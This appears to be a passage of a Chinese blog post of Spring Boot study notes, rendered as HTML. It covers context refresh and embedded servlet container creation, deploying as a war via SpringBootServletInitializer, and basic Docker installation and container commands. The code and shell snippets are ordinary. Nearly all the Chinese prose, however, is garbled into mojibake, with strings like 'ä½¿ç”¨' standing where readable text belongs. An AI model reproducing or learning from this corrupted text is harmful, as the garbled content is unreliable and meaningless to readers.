prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// Allows post-processing of the bean factory in context subclasses.</span></span><br><span class="line">         postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Invoke factory processors registered as beans in the context.</span></span><br><span class="line">         invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Register bean processors that intercept bean creation.</span></span><br><span class="line">         registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize message source for this context.</span></span><br><span class="line">         initMessageSource();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize event multicaster for this context.</span></span><br><span class="line">         initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize other special beans in specific context subclasses.</span></span><br><span class="line">         onRefresh();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check for listener beans and register them.</span></span><br><span class="line">         registerListeners();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">         finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Last step: publish corresponding event.</span></span><br><span class="line">         finishRefresh();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">         <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Exception encountered during context initialization - &quot;</span> +</span><br><span class="line">                  <span class="string">&quot;cancelling refresh attempt: &quot;</span> + ex);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">         destroyBeans();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Reset &#x27;active&#x27; flag.</span></span><br><span class="line">         cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">         <span class="keyword">throw</span> ex;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class="line">         <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">         resetCommonCaches();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ï¼‰ã€  onRefresh(); webçš„iocå®¹å™¨é‡å†™äº†onRefreshæ–¹æ³•</p><p>5ï¼‰ã€webiocå®¹å™¨ä¼šåˆ›å»ºåµŒå…¥å¼çš„Servletå®¹å™¨ï¼›<strong>createEmbeddedServletContainer</strong>();</p><p><strong>6ï¼‰ã€è·å–åµŒå…¥å¼çš„Servletå®¹å™¨å·¥å‚ï¼š</strong></p><p>EmbeddedServletContainerFactory containerFactory &#x3D; getEmbeddedServletContainerFactory();</p><p>â€‹ä»iocå®¹å™¨ä¸­è·å–EmbeddedServletContainerFactory ç»„ä»¶ï¼›<strong>TomcatEmbeddedServletContainerFactory</strong>åˆ›å»ºå¯¹è±¡ï¼Œåç½®å¤„ç†å™¨ä¸€çœ‹æ˜¯è¿™ä¸ªå¯¹è±¡ï¼Œå°±è·å–æ‰€æœ‰çš„å®šåˆ¶å™¨æ¥å…ˆå®šåˆ¶Servletå®¹å™¨çš„ç›¸å…³é…ç½®ï¼›</p><p>7ï¼‰ã€<strong>ä½¿ç”¨å®¹å™¨å·¥å‚è·å–åµŒå…¥å¼çš„Servletå®¹å™¨</strong>ï¼šthis.embeddedServletContainer &#x3D; containerFactory      .getEmbeddedServletContainer(getSelfInitializer());</p><p>8ï¼‰ã€åµŒå…¥å¼çš„Servletå®¹å™¨åˆ›å»ºå¯¹è±¡å¹¶å¯åŠ¨Servletå®¹å™¨ï¼›</p><p><strong>å…ˆå¯åŠ¨åµŒå…¥å¼çš„Servletå®¹å™¨ï¼Œå†å°†iocå®¹å™¨ä¸­å‰©ä¸‹æ²¡æœ‰åˆ›å»ºå‡ºçš„å¯¹è±¡è·å–å‡ºæ¥ï¼›</strong></p><p><strong>&#x3D;&#x3D;IOCå®¹å™¨å¯åŠ¨åˆ›å»ºåµŒå…¥å¼çš„Servletå®¹å™¨&#x3D;&#x3D;</strong></p><h2><span id="9-ä½¿ç”¨å¤–ç½®çš„servletå®¹å™¨">9ã€ä½¿ç”¨å¤–ç½®çš„Servletå®¹å™¨</span></h2><p>åµŒå…¥å¼Servletå®¹å™¨ï¼šåº”ç”¨æ‰“æˆå¯æ‰§è¡Œçš„jar</p><p>â€‹ä¼˜ç‚¹ï¼šç®€å•ã€ä¾¿æºï¼›</p><p>â€‹ç¼ºç‚¹ï¼šé»˜è®¤ä¸æ”¯æŒJSPã€ä¼˜åŒ–å®šåˆ¶æ¯”è¾ƒå¤æ‚ï¼ˆä½¿ç”¨å®šåˆ¶å™¨ã€ServerPropertiesã€è‡ªå®šä¹‰EmbeddedServletContainerCustomizerã€‘ï¼Œè‡ªå·±ç¼–å†™åµŒå…¥å¼Servletå®¹å™¨çš„åˆ›å»ºå·¥å‚ã€EmbeddedServletContainerFactoryã€‘ï¼‰ï¼›</p><p>å¤–ç½®çš„Servletå®¹å™¨ï¼šå¤–é¢å®‰è£…Tomcatâ€”åº”ç”¨waråŒ…çš„æ–¹å¼æ‰“åŒ…ï¼›</p><h3><span id="æ­¥éª¤">æ­¥éª¤</span></h3><p>1ï¼‰ã€å¿…é¡»åˆ›å»ºä¸€ä¸ªwaré¡¹ç›®ï¼›ï¼ˆåˆ©ç”¨ideaåˆ›å»ºå¥½ç›®å½•ç»“æ„ï¼‰</p><p>2ï¼‰ã€å°†åµŒå…¥å¼çš„TomcatæŒ‡å®šä¸ºprovidedï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3ï¼‰ã€å¿…é¡»ç¼–å†™ä¸€ä¸ª<strong>SpringBootServletInitializer</strong>çš„å­ç±»ï¼Œå¹¶è°ƒç”¨configureæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletInitializer</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder application)</span> &#123;</span><br><span class="line">       <span class="comment">//ä¼ å…¥SpringBootåº”ç”¨çš„ä¸»ç¨‹åº</span></span><br><span class="line">      <span class="keyword">return</span> application.sources(SpringBoot04WebJspApplication.class);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ï¼‰ã€å¯åŠ¨æœåŠ¡å™¨å°±å¯ä»¥ä½¿ç”¨ï¼›</p><h3><span id="åŸç†">åŸç†</span></h3><p>jaråŒ…ï¼šæ‰§è¡ŒSpringBootä¸»ç±»çš„mainæ–¹æ³•ï¼Œå¯åŠ¨iocå®¹å™¨ï¼Œåˆ›å»ºåµŒå…¥å¼çš„Servletå®¹å™¨ï¼›</p><p>waråŒ…ï¼šå¯åŠ¨æœåŠ¡å™¨ï¼Œ<strong>æœåŠ¡å™¨å¯åŠ¨SpringBootåº”ç”¨</strong>ã€SpringBootServletInitializerã€‘ï¼Œå¯åŠ¨iocå®¹å™¨ï¼›</p><p>servlet3.0ï¼ˆSpringæ³¨è§£ç‰ˆï¼‰ï¼š</p><p>8.2.4 Shared libraries &#x2F; runtimes pluggabilityï¼š</p><p>è§„åˆ™ï¼š</p><p>â€‹1ï¼‰ã€æœåŠ¡å™¨å¯åŠ¨ï¼ˆwebåº”ç”¨å¯åŠ¨ï¼‰ä¼šåˆ›å»ºå½“å‰webåº”ç”¨é‡Œé¢æ¯ä¸€ä¸ªjaråŒ…é‡Œé¢ServletContainerInitializerå®ä¾‹ï¼š</p><p>â€‹2ï¼‰ã€ServletContainerInitializerçš„å®ç°æ”¾åœ¨jaråŒ…çš„META-INF&#x2F;servicesæ–‡ä»¶å¤¹ä¸‹ï¼Œæœ‰ä¸€ä¸ªåä¸ºjavax.servlet.ServletContainerInitializerçš„æ–‡ä»¶ï¼Œå†…å®¹å°±æ˜¯ServletContainerInitializerçš„å®ç°ç±»çš„å…¨ç±»å</p><p>â€‹3ï¼‰ã€è¿˜å¯ä»¥ä½¿ç”¨@HandlesTypesï¼Œåœ¨åº”ç”¨å¯åŠ¨çš„æ—¶å€™åŠ è½½æˆ‘ä»¬æ„Ÿå…´è¶£çš„ç±»ï¼›</p><p>æµç¨‹ï¼š</p><p>1ï¼‰ã€å¯åŠ¨Tomcat</p><p>2ï¼‰ã€org\springframework\spring-web\4.3.14.RELEASE\spring-web-4.3.14.RELEASE.jar!\META-INF\services\javax.servlet.ServletContainerInitializerï¼š</p><p>Springçš„webæ¨¡å—é‡Œé¢æœ‰è¿™ä¸ªæ–‡ä»¶ï¼š<strong>org.springframework.web.SpringServletContainerInitializer</strong></p><p>3ï¼‰ã€SpringServletContainerInitializerå°†@HandlesTypes(WebApplicationInitializer.class)æ ‡æ³¨çš„æ‰€æœ‰è¿™ä¸ªç±»å‹çš„ç±»éƒ½ä¼ å…¥åˆ°onStartupæ–¹æ³•çš„Set&lt;Class&lt;?&gt;&gt;ï¼›ä¸ºè¿™äº›WebApplicationInitializerç±»å‹çš„ç±»åˆ›å»ºå®ä¾‹ï¼›</p><p>4ï¼‰ã€æ¯ä¸€ä¸ªWebApplicationInitializeréƒ½è°ƒç”¨è‡ªå·±çš„onStartupï¼›</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302221835.png"></p><p>5ï¼‰ã€ç›¸å½“äºæˆ‘ä»¬çš„SpringBootServletInitializerçš„ç±»ä¼šè¢«åˆ›å»ºå¯¹è±¡ï¼Œå¹¶æ‰§è¡ŒonStartupæ–¹æ³•</p><p>6ï¼‰ã€SpringBootServletInitializerå®ä¾‹æ‰§è¡ŒonStartupçš„æ—¶å€™ä¼šcreateRootApplicationContextï¼›åˆ›å»ºå®¹å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">createRootApplicationContext</span><span class="params">(</span></span><br><span class="line"><span class="params">      ServletContext servletContext)</span> &#123;</span><br><span class="line">    <span class="comment">//1ã€åˆ›å»ºSpringApplicationBuilder</span></span><br><span class="line">   <span class="type">SpringApplicationBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> createSpringApplicationBuilder();</span><br><span class="line">   <span class="type">StandardServletEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardServletEnvironment</span>();</span><br><span class="line">   environment.initPropertySources(servletContext, <span class="literal">null</span>);</span><br><span class="line">   builder.environment(environment);</span><br><span class="line">   builder.main(getClass());</span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">parent</span> <span class="operator">=</span> getExistingRootWebApplicationContext(servletContext);</span><br><span class="line">   <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.logger.info(<span class="string">&quot;Root context already created (using as parent).&quot;</span>);</span><br><span class="line">      servletContext.setAttribute(</span><br><span class="line">            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="literal">null</span>);</span><br><span class="line">      builder.initializers(<span class="keyword">new</span> <span class="title class_">ParentContextApplicationContextInitializer</span>(parent));</span><br><span class="line">   &#125;</span><br><span class="line">   builder.initializers(</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ServletContextApplicationContextInitializer</span>(servletContext));</span><br><span class="line">   builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è°ƒç”¨configureæ–¹æ³•ï¼Œå­ç±»é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼Œå°†SpringBootçš„ä¸»ç¨‹åºç±»ä¼ å…¥äº†è¿›æ¥</span></span><br><span class="line">   builder = configure(builder);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä½¿ç”¨builderåˆ›å»ºä¸€ä¸ªSpringåº”ç”¨</span></span><br><span class="line">   <span class="type">SpringApplication</span> <span class="variable">application</span> <span class="operator">=</span> builder.build();</span><br><span class="line">   <span class="keyword">if</span> (application.getSources().isEmpty() &amp;&amp; AnnotationUtils</span><br><span class="line">         .findAnnotation(getClass(), Configuration.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">      application.getSources().add(getClass());</span><br><span class="line">   &#125;</span><br><span class="line">   Assert.state(!application.getSources().isEmpty(),</span><br><span class="line">         <span class="string">&quot;No SpringApplication sources have been defined. Either override the &quot;</span></span><br><span class="line">               + <span class="string">&quot;configure method or add an @Configuration annotation&quot;</span>);</span><br><span class="line">   <span class="comment">// Ensure error pages are registered</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.registerErrorPageFilter) &#123;</span><br><span class="line">      application.getSources().add(ErrorPageFilterConfiguration.class);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//å¯åŠ¨Springåº”ç”¨</span></span><br><span class="line">   <span class="keyword">return</span> run(application);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7ï¼‰ã€Springçš„åº”ç”¨å°±å¯åŠ¨å¹¶ä¸”åˆ›å»ºIOCå®¹å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">   <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">FailureAnalyzers</span> <span class="variable">analyzers</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   <span class="type">SpringApplicationRunListeners</span> <span class="variable">listeners</span> <span class="operator">=</span> getRunListeners(args);</span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">ApplicationArguments</span> <span class="variable">applicationArguments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultApplicationArguments</span>(</span><br><span class="line">            args);</span><br><span class="line">      <span class="type">ConfigurableEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">      <span class="type">Banner</span> <span class="variable">printedBanner</span> <span class="operator">=</span> printBanner(environment);</span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">      analyzers = <span class="keyword">new</span> <span class="title class_">FailureAnalyzers</span>(context);</span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//åˆ·æ–°IOCå®¹å™¨</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      listeners.finished(context, <span class="literal">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">StartupInfoLogger</span>(<span class="built_in">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&#x3D;&#x3D;å¯åŠ¨Servletå®¹å™¨ï¼Œå†å¯åŠ¨SpringBootåº”ç”¨&#x3D;&#x3D;</strong></p><h1><span id="äº”-docker">äº”ã€Docker</span></h1><h2><span id="1-ç®€ä»‹">1ã€ç®€ä»‹</span></h2><p><strong>Docker</strong>æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼›æ˜¯ä¸€ä¸ªè½»é‡çº§å®¹å™¨æŠ€æœ¯ï¼›</p><p>Dockeræ”¯æŒå°†è½¯ä»¶ç¼–è¯‘æˆä¸€ä¸ªé•œåƒï¼›ç„¶ååœ¨é•œåƒä¸­å„ç§è½¯ä»¶åšå¥½é…ç½®ï¼Œå°†é•œåƒå‘å¸ƒå‡ºå»ï¼Œå…¶ä»–ä½¿ç”¨è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªé•œåƒï¼›</p><p>è¿è¡Œä¸­çš„è¿™ä¸ªé•œåƒç§°ä¸ºå®¹å™¨ï¼Œå®¹å™¨å¯åŠ¨æ˜¯éå¸¸å¿«é€Ÿçš„ã€‚</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145450.png"></p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145531.png"></p><h2><span id="2-æ ¸å¿ƒæ¦‚å¿µ">2ã€æ ¸å¿ƒæ¦‚å¿µ</span></h2><p>dockerä¸»æœº(Host)ï¼šå®‰è£…äº†Dockerç¨‹åºçš„æœºå™¨ï¼ˆDockerç›´æ¥å®‰è£…åœ¨æ“ä½œç³»ç»Ÿä¹‹ä¸Šï¼‰ï¼›</p><p>dockerå®¢æˆ·ç«¯(Client)ï¼šè¿æ¥dockerä¸»æœºè¿›è¡Œæ“ä½œï¼›</p><p>dockerä»“åº“(Registry)ï¼šç”¨æ¥ä¿å­˜å„ç§æ‰“åŒ…å¥½çš„è½¯ä»¶é•œåƒï¼›</p><p>dockeré•œåƒ(Images)ï¼šè½¯ä»¶æ‰“åŒ…å¥½çš„é•œåƒï¼›æ”¾åœ¨dockerä»“åº“ä¸­ï¼›</p><p>dockerå®¹å™¨(Container)ï¼šé•œåƒå¯åŠ¨åçš„å®ä¾‹ç§°ä¸ºä¸€ä¸ªå®¹å™¨ï¼›å®¹å™¨æ˜¯ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303165113.png"></p><p>ä½¿ç”¨Dockerçš„æ­¥éª¤ï¼š</p><p>1ï¼‰ã€å®‰è£…Docker</p><p>2ï¼‰ã€å»Dockerä»“åº“æ‰¾åˆ°è¿™ä¸ªè½¯ä»¶å¯¹åº”çš„é•œåƒï¼›</p><p>3ï¼‰ã€ä½¿ç”¨Dockerè¿è¡Œè¿™ä¸ªé•œåƒï¼Œè¿™ä¸ªé•œåƒå°±ä¼šç”Ÿæˆä¸€ä¸ªDockerå®¹å™¨ï¼›</p><p>4ï¼‰ã€å¯¹å®¹å™¨çš„å¯åŠ¨åœæ­¢å°±æ˜¯å¯¹è½¯ä»¶çš„å¯åŠ¨åœæ­¢ï¼›</p><h2><span id="3-å®‰è£…docker">3ã€å®‰è£…Docker</span></h2><h4><span id="1-å®‰è£…linuxè™šæ‹Ÿæœº">1ï¼‰ã€å®‰è£…linuxè™šæ‹Ÿæœº</span></h4><p>â€‹1ï¼‰ã€VMWareã€VirtualBoxï¼ˆå®‰è£…ï¼‰ï¼›</p><p>â€‹2ï¼‰ã€å¯¼å…¥è™šæ‹Ÿæœºæ–‡ä»¶centos7-atguigu.ovaï¼›</p><p>â€‹3ï¼‰ã€åŒå‡»å¯åŠ¨linuxè™šæ‹Ÿæœº;ä½¿ç”¨  root&#x2F; 123456ç™»é™†</p><p>â€‹4ï¼‰ã€ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥linuxæœåŠ¡å™¨è¿›è¡Œå‘½ä»¤æ“ä½œï¼›</p><p>â€‹5ï¼‰ã€è®¾ç½®è™šæ‹Ÿæœºç½‘ç»œï¼›</p><p>â€‹æ¡¥æ¥ç½‘ç»œ&#x3D;&#x3D;&#x3D;é€‰å¥½ç½‘å¡&#x3D;&#x3D;&#x3D;&#x3D;æ¥å…¥ç½‘çº¿ï¼›</p><p>â€‹6ï¼‰ã€è®¾ç½®å¥½ç½‘ç»œä»¥åä½¿ç”¨å‘½ä»¤é‡å¯è™šæ‹Ÿæœºçš„ç½‘ç»œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>â€‹7ï¼‰ã€æŸ¥çœ‹linuxçš„ipåœ°å€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>â€‹8ï¼‰ã€ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥linuxï¼›</p><h4><span id="2-åœ¨linuxè™šæ‹Ÿæœºä¸Šå®‰è£…docker">2ï¼‰ã€åœ¨linuxè™šæ‹Ÿæœºä¸Šå®‰è£…docker</span></h4><p>æ­¥éª¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ£€æŸ¥å†…æ ¸ç‰ˆæœ¬ï¼Œå¿…é¡»æ˜¯3.10åŠä»¥ä¸Š</span><br><span class="line">uname -r</span><br><span class="line">2ã€å®‰è£…docker</span><br><span class="line">yum install docker</span><br><span class="line">3ã€è¾“å…¥yç¡®è®¤å®‰è£…</span><br><span class="line">4ã€å¯åŠ¨docker</span><br><span class="line">[root@localhost ~]# systemctl start docker</span><br><span class="line">[root@localhost ~]# docker -v</span><br><span class="line">Docker version 1.12.6, build 3e8e77d/1.12.6</span><br><span class="line">5ã€å¼€æœºå¯åŠ¨docker</span><br><span class="line">[root@localhost ~]# systemctl enable docker</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br><span class="line">6ã€åœæ­¢docker</span><br><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2><span id="4-dockerå¸¸ç”¨å‘½ä»¤ampæ“ä½œ">4ã€Dockerå¸¸ç”¨å‘½ä»¤&amp;æ“ä½œ</span></h2><h3><span id="1-é•œåƒæ“ä½œ">1ï¼‰ã€é•œåƒæ“ä½œ</span></h3><table><thead><tr><th>æ“ä½œ</th><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ£€ç´¢</td><td>docker  search å…³é”®å­—  egï¼šdocker  search redis</td><td>æˆ‘ä»¬ç»å¸¸å»docker  hubä¸Šæ£€ç´¢é•œåƒçš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚é•œåƒçš„TAGã€‚</td></tr><tr><td>æ‹‰å–</td><td>docker pull é•œåƒå:tag</td><td>:tagæ˜¯å¯é€‰çš„ï¼Œtagè¡¨ç¤ºæ ‡ç­¾ï¼Œå¤šä¸ºè½¯ä»¶çš„ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯latest</td></tr><tr><td>åˆ—è¡¨</td><td>docker images</td><td>æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°é•œåƒ</td></tr><tr><td>åˆ é™¤</td><td>docker rmi image-id</td><td>åˆ é™¤æŒ‡å®šçš„æœ¬åœ°é•œåƒ</td></tr></tbody></table><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p><h3><span id="2-å®¹å™¨æ“ä½œ">2ï¼‰ã€å®¹å™¨æ“ä½œ</span></h3><p>è½¯ä»¶é•œåƒï¼ˆQQå®‰è£…ç¨‹åºï¼‰â€”-è¿è¡Œé•œåƒâ€”-äº§ç”Ÿä¸€ä¸ªå®¹å™¨ï¼ˆæ­£åœ¨è¿è¡Œçš„è½¯ä»¶ï¼Œè¿è¡Œçš„QQï¼‰ï¼›</p><p>æ­¥éª¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1ã€æœç´¢é•œåƒ</span><br><span class="line">[root@localhost ~]# docker search tomcat</span><br><span class="line">2ã€æ‹‰å–é•œåƒ</span><br><span class="line">[root@localhost ~]# docker pull tomcat</span><br><span class="line">3ã€æ ¹æ®é•œåƒå¯åŠ¨å®¹å™¨</span><br><span class="line">docker run --name mytomcat -d tomcat:latest</span><br><span class="line">4ã€docker ps  </span><br><span class="line">æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨</span><br><span class="line">5ã€ åœæ­¢è¿è¡Œä¸­çš„å®¹å™¨</span><br><span class="line">docker stop  å®¹å™¨çš„id</span><br><span class="line">6ã€æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨</span><br><span class="line">docker ps -a</span><br><span class="line">7ã€å¯åŠ¨å®¹å™¨</span><br><span class="line">docker start å®¹å™¨id</span><br><span class="line">8ã€åˆ é™¤ä¸€ä¸ªå®¹å™¨</span><br><span class="line"> docker rm å®¹å™¨id</span><br><span class="line">9ã€å¯åŠ¨ä¸€ä¸ªåšäº†ç«¯å£æ˜ å°„çš„tomcat</span><br><span class="line">[root@localhost ~]# docker run -d -p 8888:8080 